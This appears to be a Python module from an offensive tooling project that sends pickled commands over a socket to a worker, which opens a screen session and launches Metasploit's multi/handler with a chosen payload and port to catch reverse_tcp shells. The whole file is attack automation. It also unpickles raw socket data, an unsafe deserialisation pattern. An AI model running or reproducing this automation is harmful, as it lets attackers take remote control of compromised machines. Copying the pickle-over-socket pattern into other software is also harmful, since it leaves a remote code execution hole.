import select
import uuid
from Data.data import Data
import pickle

def find_socket(ip: str):
    from Service.exploit_socket import client_sockets
    if client_sockets.get(ip):
        return True
    return False

def conversation(socket, data: Data, expected_answer: str):
    socket.sendall(pickle.dumps(data))
    response = answer(socket)
    if response != expected_answer:
        print(f"Error: Expected {expected_answer} but got {response}.")
        return False
    return True

def conversation_with_exploit_info(socket, data: Data):
    socket.sendall(pickle.dumps(data))
    return answer(socket)

def exploit_start(ip: str, port:int, client_ip: str, payload: str):
    from Service.exploit_socket import client_sockets
    socket = client_sockets.get(ip)
    conversation(socket, Data("Info", f"Payload request received from {client_ip}."), "OK")
    conversation(socket, Data("Info", "Start opening reverse_tcp session."), "OK")
    if answer := conversation_with_exploit_info(socket, Data("Exploit Info", f"Payload: {payload}\\IP: {client_ip}\\Port: {port}")):
        if answer == "Exist":
            print("Session already exists.")
            return True
        elif "Port" in answer:
            port = answer.split(":")[1].strip()
    conversation(socket, Data("Screen", "metasploit_" + ip + "_" + str(uuid.uuid4())), "OK")
    conversation(socket, Data("Command", "msfconsole"), "OK")
    conversation(socket, Data("Command", "use exploit/multi/handler"), "OK")
    conversation(socket, Data("Command", "set PAYLOAD " + payload), "OK")
    conversation(socket, Data("Command", "set LHOST 0.0.0.0"), "OK")
    conversation(socket, Data("Command", "set LPORT " + str(port)), "OK")
    conversation(socket, Data("Command", "exploit"), "OK")
    conversation(socket, Data("EXPLOIT", f"Payload:{payload}"), "OK")
    return True

def answer(socket):
    while True:
        ready_to_read, _, _ = select.select([socket], [], [], 1.0)
        if ready_to_read:
            data = socket.recv(1024)
            if not data:
                break
            data = pickle.loads(data)
            return data.content
    return None

